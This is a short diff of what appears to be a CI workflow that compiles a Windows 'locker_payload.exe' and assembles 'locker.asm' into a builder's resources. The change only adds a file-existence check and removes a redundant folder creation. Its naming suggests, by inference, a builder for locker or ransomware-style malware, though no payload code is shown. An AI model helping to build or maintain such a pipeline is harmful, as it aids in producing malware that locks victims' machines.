@@ -37,8 +37,14 @@ jobs:
       shell: cmd
       run: |
         mkdir builder\Resources 2>nul
-        copy locker\locker.asm builder\Resources\locker.asm
-        echo [SUCCESS] locker.asm copied
+        if exist locker\locker.asm (
+          copy locker\locker.asm builder\Resources\locker.asm
+          echo [SUCCESS] locker.asm copied
+        ) else (
+          echo [ERROR] locker.asm not found!
+          dir locker
+          exit /b 1
+        )
 
     - name: Compile Template (locker_payload.exe)
       shell: cmd
@@ -47,7 +53,6 @@ jobs:
         cd template
         g++ -static -O2 -mwindows locker_payload.cpp -o locker_payload.exe -luser32 -lkernel32 -ladvapi32
         if exist locker_payload.exe (
-          mkdir ..\builder\Resources 2>nul
           copy locker_payload.exe ..\builder\Resources\template.exe
           echo [SUCCESS] Template compiled
         ) else (
